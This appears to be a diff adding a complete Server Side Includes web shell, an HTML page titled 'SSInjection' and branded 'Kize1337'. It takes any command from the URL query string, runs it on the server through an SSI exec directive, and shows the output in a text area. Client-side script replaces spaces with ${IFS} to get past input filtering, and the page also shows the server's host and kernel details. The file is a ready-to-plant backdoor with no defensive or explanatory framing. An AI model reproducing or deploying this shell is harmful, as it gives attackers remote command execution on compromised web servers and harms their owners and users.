@@ -1,0 +1,57 @@
+<title>SSInjection </title>
+<body bgcolor="black">
+<font color="lime" face="Inconsolata">
+<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="ls" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<link href="https://fonts.googleapis.com/css?family=Inconsolata&display=swap" rel="stylesheet">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<pre>               
+    |\__/,|   (`\
+    |o o  |__ _) Kize1337 SSInjection
+  _.( T   )  `  / 
+ ((_ `^--' /_<  \
+ `` `-'(((/  (((/                                   
+</pre>
+<script language="javascript">
+    function fex()
+    {
+        var uri = document.getElementById('command').value;
+        var rep = uri.replace(/[ ]/g,'${IFS}');
+        var res = encodeURI(uri);
+        document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+    }
+    </script>
+    <script>
+    document.onkeydown = keydown;
+    function keydown(e) {
+        if (!e) e = event;
+        if (e.keyCode === 13) {
+            var uri = document.getElementById('command').value;
+            var rep = uri.replace(/[ ]/g,'${IFS}');
+            var res = encodeURI(uri);
+            document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+    
+        }
+    }
+    </script>
+    
+    </head>
+    <body>
+    <font size=2>
+        Server : <!--#exec cmd="{uname,-nr}" --><br>
+        GMT date : <!--#echo var=DATE_GMT --><br>
+        Local date : <!--#echo var=DATE_LOCAL --><br>
+        Document URI :<!--#echo var=DOCUMENT_URI --><br>
+        Last modified : <!--#echo var=LAST_MODIFIED --><br>
+<br>
+    <font size=2>Command : <input type=text size=20 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;"> <input type=button value=Execute onclick="fex();">
+    <hr>
+    Executed Command : </font><b><!--#echo var=shl --></b><br>
+<textarea bgcolor=#e4e0d8 cols=100 rows=15>
+<!--#exec cmd=$shl -->
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8afb2ab8ddfc8348","version":"2024.7.0","r":1,"serverTiming":{"name":{"cfL4":true}},"token":"ae651b278fcb4c8ab5ea87e0436cb195","b":1}' crossorigin="anonymous"></script>
